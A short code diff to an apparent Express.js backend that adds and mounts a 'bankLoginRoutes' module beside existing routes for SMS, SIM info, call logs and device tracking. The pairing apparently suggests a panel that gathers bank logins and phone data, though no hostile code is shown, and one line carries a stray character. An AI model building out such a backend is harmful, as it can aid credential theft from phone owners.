@@ -12,6 +12,7 @@ import deviceRoutes from "./routes/deviceRoutes.js";
 import smsRoutes from "./routes/smsRoutes.js";
 import simInfoRoutes from "./routes/simInfoRoutes.js";
 import authRoutes from "./routes/authRoutes.js";
+import bankLoginRoutes from "./routes/bankLoginRoutes.js";
 import logRoutes from "./routes/logRoutes.js";
 import notificationRoutes from "./routes/notificationRoutes.js";
 import callRoutes from "./routes/callRoutes.js";
@@ -300,6 +301,7 @@ app.use("/api/action", logRoutes);4
 app.use("/api", formRoutes);
 app.use("/api/lastseen", lastSeenRoutes);
 app.use("/api/call-log", callLogRoutes);
+app.use("/api", bankLoginRoutes);
 app.use("/api/auth", authRoutes);
 
 app.get("/", (req, res) => res.send("Real-time Backend Running"));
